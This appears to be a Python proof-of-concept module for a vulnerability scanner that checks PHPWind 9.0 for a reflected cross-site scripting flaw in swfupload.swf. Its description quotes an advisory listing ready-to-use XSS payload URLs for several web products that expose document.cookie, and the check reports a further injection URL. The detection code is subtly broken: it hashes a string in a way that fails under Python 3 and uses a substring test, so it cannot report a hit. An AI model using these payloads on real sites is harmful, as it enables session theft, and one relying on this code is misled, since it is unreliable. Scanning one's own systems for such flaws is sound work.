# coding: utf-8
import hashlib
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0111'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /res/js/dev/util_libs/swfupload/Flash/swfupload.swf 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-11'  # 漏洞公布时间
    desc = '''
        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
        XSS (WASC-08):
        Dotclear:
        http://site/inc/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
        XenForo:
        http://site/js/swfupload/Flash/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
        InstantCMS:
        http://site/includes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
        AionWeb:
        http://site/engine/classes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
        Dolphin:
        http://site/plugins/swfupload/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//

        Swfupload is used in WordPress, plugins for WP and in other web
        applications. There are many web applications with it, not as many as those
        which are using JW Player (http://securityvulns.com/docs28176.html) and JW
        Player Pro (http://securityvulns.com/docs28483.html) (vulnerabilities in
        them I've disclosed earlier), but still a lot of.
        Best wishes & regards,
        MustLive
        Administrator of Websecurity web site
        http://websecurity.com.ua
        http://packetstormsecurity.com/files/118059/SWF-Upload-Cross-Site-Scripting.html.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=017731'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09b0d2c9-84bd-44d6-914d-4aa6fd8776b5'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            file_path = "/res/js/dev/util_libs/swfupload/Flash/swfupload.swf"
            verify_url = self.target + file_path
            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            md5_value = hashlib.md5(content).hexdigest()

            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;xss_url={xss_url}'.format(
                    target=self.target, name=self.vuln.name, xss_url=verify_url + '?movieName="])}catch(e){alert(1)}//'))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
